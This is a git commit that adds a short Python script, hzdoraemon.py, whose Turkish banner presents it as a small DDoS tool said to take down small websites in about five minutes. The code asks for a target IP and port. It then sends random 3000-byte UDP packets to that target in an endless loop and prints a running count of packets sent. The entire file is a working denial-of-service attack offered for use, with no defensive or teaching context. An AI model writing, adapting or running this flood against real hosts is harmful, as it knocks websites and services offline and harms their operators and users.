19dba8fde30f15a13ba687f37f721f38e860b836
hzdoraemon <hzdoraemonhack@gmail.com>
2020-12-26 01:54:14 +0300

    merhaba

---
+++ hzdoraemon.py
@@ -0,0 +1,31 @@
+import socket
+import random
+import os
+
+os.system("clear")
+banner="""
+##########################
+#HZDORAEMON V1.0	 #
+#Code by HZDORAEMON	 #
+##########################
+NOT                      #
+ARKADASLARINIZ ILE DALIN #
+UFAK BIR DDOS ARACIDIR   #
+KUCUK SITELERI ORTALAMA  #
+5DK DA DUSURUR.........  #
+##########################
+"""
+print(banner)
+
+hedef_ip=raw_input("hedef ip: ")
+hedef_port=input("hedef port: ")
+
+bytes=random._urandom(3000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sayac=0
+while True:
+	sock.sendto(bytes,(hedef_ip,hedef_port))
+	sayac=sayac+1
+	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
+
